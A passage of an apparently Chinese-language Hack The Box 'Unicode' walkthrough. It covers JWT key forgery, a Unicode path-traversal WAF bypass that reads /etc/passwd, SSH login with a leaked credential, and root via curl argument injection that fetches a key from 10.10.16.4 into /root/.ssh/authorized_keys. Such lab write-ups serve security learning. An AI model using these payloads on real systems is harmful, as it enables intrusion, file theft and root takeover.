+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;publickey.crt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>key = RSA.importKey(fp.read())<br>fp.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;n:&quot;</span>, <span class="hljs-built_in">hex</span>(key.n)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;e:&quot;</span>, <span class="hljs-built_in">hex</span>(key.e)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">➤  python2 ne.py                                                                                                      <br><span class="hljs-symbol">n:</span> <span class="hljs-number">0xc71e2172aacd5d11239575380d3768f0615f23e049bce26eed5b86a0646ddd919a2999831d7674c0b40900c26e51491c01dfde7c59bbd328a73ffb96e85d55bdf22e60880c3f504060b0c3a231f26df74898d8ca46fae6378b4c00c754fb6134408c23a46ccc58ee8f6a5e3533a38ddee1303e10057433258b4acd72fd9a20c4bfce2c24ed21d4a235b2e1556ba52ee9027bbd279facce009872d1b9e254d10eefe07f20bc6932ef269bdedd32127948316</span><br><span class="hljs-symbol">e:</span> <span class="hljs-number">0x10001</span>L<br></code></pre></td></tr></table></figure>
+
+<p>但是观察服务器上的<code>jwks.json</code>，我们发现和我们得到的n、e值格式不太一样。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;n&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AQAB&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将<code>AQAB</code>Base64解码，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➤  <span class="hljs-built_in">echo</span> AQAB | <span class="hljs-built_in">base64</span> -d | xxd<br>00000000: 0100 01                                  ...<br></code></pre></td></tr></table></figure>
+
+<p>合理推测服务器上的n、e是原始十六进制的Base64编码。</p>
+<p>我们也可以据此生成我们的<code>jwks.json</code>文件。e值我们是不用修改了，只用修改n值即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➤  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;c71e2172aacd5d11239575380d3768f0615f23e049bce26eed5b86a0646ddd919a2999831d7674c0b40900c26e51491c01dfde7c59bbd328a73ffb96e85d55bdf22e60880c3f504060b0c3a231f26df74898d8ca46fae6378b4c00c754fb6134408c23a46ccc58ee8f6a5e3533a38ddee1303e10057433258b4acd72fd9a20c4bfce2c24ed21d4a235b2e1556ba52ee9027bbd279facce009872d1b9e254d10eefe07f20bc6932ef269bdedd32127948316&quot;</span> | xxd -r -p | <span class="hljs-built_in">base64</span> -w0<br><br>xx4hcqrNXREjlXU4DTdo8GFfI+BJvOJu7VuGoGRt3ZGaKZmDHXZ0wLQJAMJuUUkcAd/efFm70yinP/uW6F1VvfIuYIgMP1BAYLDDojHybfdImNjKRvrmN4tMAMdU+2E0QIwjpGzMWO6Pal41M6ON3uEwPhAFdDMli0rNcv2aIMS/ziwk7SHUojWy4VVrpS7pAnu9J5+szgCYctG54lTRDu/gfyC8aTLvJpve3TISeUgx<br></code></pre></td></tr></table></figure>
+
+<p>如此，替换后最后得到我们的<code>jwks.json</code>文件。最后起一个http服务器即可。</p>
+<p>成功后我们就以admin身份进入了（至于为啥是admin，只能说猜的）。</p>
+<h3 id="点题：Unicode"><a href="#点题：Unicode" class="headerlink" title="点题：Unicode"></a>点题：Unicode</h3><p>进入后能够看到admin版的dashboard。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519121951230.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220519121951230"></p>
+<p>几个按钮点一遍后发现一个查看pdf报表的链接，猜测有SSRF。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518174401028.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518174401028"></p>
+<p>读取一些常见的文件发现一些文件会显示被过滤，比如在这里读取了<code>/etc/passwd</code>。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518174832678.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518174832678"></p>
+<p>在读取一些不存在的文件的时候会显示<code>Not Found</code>。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518174932813.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518174932813"></p>
+<p>也就是我们需要对这个waf进行一个绕过了，结合题目是Unicode，我们的ByPass机制应该和Unicode有关。</p>
+<p>但首先我们需要知道waf的过滤机制，在一些FUZZ工作后我发现有如下规律：</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>..</code></td>
+<td>通过</td>
+</tr>
+<tr>
+<td><code>./</code></td>
+<td>通过</td>
+</tr>
+<tr>
+<td><code>../</code></td>
+<td>拦截</td>
+</tr>
+<tr>
+<td><code>/et</code></td>
+<td>通过</td>
+</tr>
+<tr>
+<td><code>/etc</code></td>
+<td>拦截</td>
+</tr>
+<tr>
+<td><code>et</code></td>
+<td>通过</td>
+</tr>
+<tr>
+<td><code>etc</code></td>
+<td>拦截</td>
+</tr>
+<tr>
+<td><code>..etc</code></td>
+<td>通过</td>
+</tr>
+<tr>
+<td><code>var</code></td>
+<td>通过</td>
+</tr>
+<tr>
+<td><code>/var</code></td>
+<td>拦截</td>
+</tr>
+<tr>
+<td><code>/abc</code></td>
+<td>通过</td>
+</tr>
+</tbody></table>
+<p>也就是这个waf似乎过滤了一些根目录文件夹名和<code>../</code>这个符号。</p>
+<p>在尝试后我们发现可以通过Unicode兼容性绕过过滤。<a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">参考</a></p>
+<p>所以我们可以将<code>..</code>替换成<code>‥</code>进行绕过，也可以使用<code>Enclosed alphanumerics</code>。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 方案1</span><br>http:<span class="hljs-regexp">//</span>hackmedia.htb<span class="hljs-regexp">/display/</span>?page=‥<span class="hljs-regexp">/‥/</span>‥<span class="hljs-regexp">/‥/</span>etc/passwd<br><br><span class="hljs-comment"># 方案2，理论上可行。但是在这里这个失败了，原因未知。</span><br>http:<span class="hljs-regexp">//</span>hackmedia.htb<span class="hljs-regexp">/display/</span>?page=<span class="hljs-regexp">/ⓔⓣⓒ/</span>ⓟⓐⓢⓢⓦⓓ<br></code></pre></td></tr></table></figure>
+
+<p>最后使用方案1成功读取了文件。</p>
+<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518180737523.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518180737523"></p>
+<p>看一眼<code>/proc/self/cmdline</code>，这个熟悉的8000端口和<code>uwsgi</code>，是flask没跑了。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518183805959.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518183805959"></p>
+<p>然后是<code>/proc/self/environ</code>变量，能够发现一个code用户。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518183901611.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518183901611"></p>
+<p>然后尝试读一下源码，典型的flask的主py文件名是<code>app.py</code>，能够成功读取。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518184332934.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518184332934"></p>
+<p>然后是数据库配置文件。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518184400336.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518184400336"></p>
+<p>得到凭据信息<code>code:B3stC0d3r2021@@!</code>，拿去撞库登录ssh，成功。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518184545949.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518184545949"></p>
+<h1 id="0x02-Root"><a href="#0x02-Root" class="headerlink" title="0x02 Root"></a>0x02 Root</h1><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>接下来就是提权了，<code>sudo -l</code> 就能直接看到我们的目标。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">code<span class="hljs-variable">@code</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> code on <span class="hljs-symbol">code:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> code may run the following commands on <span class="hljs-symbol">code:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/treport<br></code></pre></td></tr></table></figure>
+
+<h2 id="treport-逆向"><a href="#treport-逆向" class="headerlink" title="treport 逆向"></a>treport 逆向</h2><p>运行文件能够看到这是一个处理report的小脚本。从这个文件的功能不难发现可能的提权方式就是文件覆写（包括写SSH，sudoer文件等）。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">code@<span class="hljs-selector-tag">code</span>:~$ sudo /usr/bin/treport<br><span class="hljs-number">1</span><span class="hljs-selector-class">.Create</span> Threat Report.<br><span class="hljs-number">2</span><span class="hljs-selector-class">.Read</span> Threat Report.<br><span class="hljs-number">3</span><span class="hljs-selector-class">.Download</span> A Threat Report.<br><span class="hljs-number">4</span><span class="hljs-selector-class">.Quit</span>.<br>Enter your choice:<br></code></pre></td></tr></table></figure>
+
+<p>用<code>file</code>命令看看，能够发现这是一个ELF可执行文件。</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">code@code:~$ <span class="hljs-keyword">file</span> <span class="hljs-regexp">/usr/</span>bin/treport<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /</span>lib64<span class="hljs-regexp">/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/</span>Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span>, stripped<br></code></pre></td></tr></table></figure>
+
+<p>另外这个文件大得过分，和它所体现的功能实在不是很对应。这种一般都是使用了某些脚本代码打包工具。</p>
+<p>将文件脱下用IDA看看，能够看到很多<code>Py</code>开头的文件。初步推断就是Python。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518191649135.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220518191649135"></p>
+<p>然后尝试使用<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">PyInstaller Extractor</a>提取pyc文件，成功。</p>
+<figure class="highlight plaintext"><figcaption><span>python pyinstxtractor.py ../../桌面/Unicode/treport</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ➤">➤  python pyinstxtractor.py ../../桌面/Unicode/treport<br>[+] Processing ../../桌面/Unicode/treport<br>[+] Pyinstaller version: 2.1+<br>[+] Python version: 38<br>[+] Length of package: 6798297 bytes<br>[+] Found 46 files in CArchive<br>[+] Beginning extraction...please standby<br>[+] Possible entry point: pyiboot01_bootstrap.pyc<br>[+] Possible entry point: pyi_rth_pkgutil.pyc<br>[+] Possible entry point: pyi_rth_multiprocessing.pyc<br>[+] Possible entry point: pyi_rth_inspect.pyc<br>[+] Possible entry point: treport.pyc<br>[!] Warning: This script is running in a different Python version than the one used to build the executable.<br>[!] Please run this script in Python38 to prevent extraction errors during unmarshalling<br>[!] Skipping pyz extraction<br>[+] Successfully extracted pyinstaller archive: ../../桌面/Unicode/treport<br><br>You can now use a python decompiler on the pyc files within the extracted directory<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">➤  ll | grep pyc         <br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 1.4K  5月<span class="hljs-number"> 18 </span>19:36 pyiboot01_bootstrap.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 1.8K  5月<span class="hljs-number"> 18 </span>19:36 pyimod01_os_path.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 8.7K  5月<span class="hljs-number"> 18 </span>19:36 pyimod02_archive.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali  13K  5月<span class="hljs-number"> 18 </span>19:36 pyimod03_importers.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 3.4K  5月<span class="hljs-number"> 18 </span>19:36 pyimod04_ctypes.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali <span class="hljs-number"> 688 </span> 5月<span class="hljs-number"> 18 </span>19:36 pyi_rth_inspect.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 2.1K  5月<span class="hljs-number"> 18 </span>19:36 pyi_rth_multiprocessing.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 1.1K  5月<span class="hljs-number"> 18 </span>19:36 pyi_rth_pkgutil.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali <span class="hljs-number"> 311 </span> 5月<span class="hljs-number"> 18 </span>19:36 struct.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 2.6K  5月<span class="hljs-number"> 18 </span>19:36 treport.pyc<br></code></pre></td></tr></table></figure>
+
+<p>然后使用 <a target="_blank" rel="noopener" href="https://pypi.org/project/uncompyle6/">uncompyle6</a> 将pyc文件还原成py文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.8.0</span><br><span class="hljs-comment"># Python bytecode 3.8.0 (3413)</span><br><span class="hljs-comment"># Decompiled from: Python 3.8.2 (default, Jul 16 2020, 14:00:26) </span><br><span class="hljs-comment"># [GCC 9.3.0]</span><br><span class="hljs-comment"># Embedded file name: treport.py</span><br><span class="hljs-keyword">import</span> os, sys<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">threat_report</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">self</span>):<br>        file_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter the filename:&#x27;</span>)<br>        content = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter the report:&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../&#x27;</span> <span class="hljs-keyword">in</span> file_name:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NOT ALLOWED&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        file_path = <span class="hljs-string">&#x27;/root/reports/&#x27;</span> + file_name<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (fd):<br>            fd.write(content)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">list_files</span>(<span class="hljs-params">self</span>):<br>        file_list = os.listdir(<span class="hljs-string">&#x27;/root/reports/&#x27;</span>)<br>        files_in_dir = <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">str</span>(elem) <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> file_list])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ALL THE THREAT REPORTS:&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(files_in_dir)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">self</span>):<br>        file_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;\nEnter the filename:&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../&#x27;</span> <span class="hljs-keyword">in</span> file_name:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NOT ALLOWED&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        contents = <span class="hljs-string">&#x27;&#x27;</span><br>        file_name = <span class="hljs-string">&#x27;/root/reports/&#x27;</span> + file_name<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> (fd):<br>                contents = fd.read()<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SOMETHING IS WRONG&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(contents)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self</span>):<br>        now = datetime.now()<br>        current_time = now.strftime(<span class="hljs-string">&#x27;%H_%M_%S&#x27;</span>)<br>        command_injection_list = [<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>]<br>        ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter the IP/file_name:&#x27;</span>)<br>        res = <span class="hljs-built_in">bool</span>(re.search(<span class="hljs-string">&#x27;\\s&#x27;</span>, ip))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;INVALID IP&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> ip <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;gopher&#x27;</span> <span class="hljs-keyword">in</span> ip <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">in</span> ip:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;INVALID URL&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">vars</span> <span class="hljs-keyword">in</span> command_injection_list:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">vars</span> <span class="hljs-keyword">in</span> ip:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NOT ALLOWED&#x27;</span>)<br>                sys.exit(<span class="hljs-number">0</span>)<br>            cmd = <span class="hljs-string">&#x27;/bin/bash -c &quot;curl &#x27;</span> + ip + <span class="hljs-string">&#x27; -o /root/reports/threat_report_&#x27;</span> + current_time + <span class="hljs-string">&#x27;&quot;&#x27;</span><br>            os.system(cmd)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    obj = threat_report()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1.Create Threat Report.&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;2.Read Threat Report.&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;3.Download A Threat Report.&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;4.Quit.&#x27;</span>)<br>    check = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> check:<br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your choice:&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            choice = <span class="hljs-built_in">int</span>(choice)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Input&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> choice == <span class="hljs-number">1</span>:<br>                obj.create()<br>            <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">2</span>:<br>                obj.list_files()<br>                obj.read_file()<br>            <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">3</span>:<br>                obj.download()<br>            <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">4</span>:<br>                check = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong input.&#x27;</span>)<br><span class="hljs-comment"># okay decompiling treport.pyc</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>其中<code>download</code>函数比较有意思，它首先检查了过滤，然后使用了<code>os.system</code>来执行命令。</p>
+<p>我们能控制的只有cmd中的ip参数，然后一些bash中的命令分隔符号都被过滤了，无法通过<code>;&amp;&#39;|&gt;&lt;</code>这些符号来执行另一条系统命令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cmd = <span class="hljs-string">&#x27;/bin/bash -c &quot;curl &#x27;</span> + ip + <span class="hljs-string">&#x27; -o /root/reports/threat_report_&#x27;</span> + current_time + <span class="hljs-string">&#x27;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是curl有一个特性就是它在传入多重参数的时候不会报错，而是会选择先出现的参数，亦即我们需要将命令中原本的<code>-o</code>参数给覆盖成自己的。</p>
+<p>这个方案还有一个问题是该如何输入空格，一个可行的方案如下，原理是使用了Bash的<a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html">Brace Expansion</a>特性。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">16.4</span><span class="hljs-regexp">/key,-o,/</span>root<span class="hljs-regexp">/.ssh/</span>authorized_keys&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在拼接后，最后执行的命令如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">16.4</span><span class="hljs-regexp">/key -o /</span>root<span class="hljs-regexp">/.ssh/</span>authorized_keys -o <span class="hljs-regexp">/root/</span>reports/threat_report_[current_time]<br></code></pre></td></tr></table></figure>
+
+<p>在本机上架设http服务器，传送自己的公钥即可。</p>
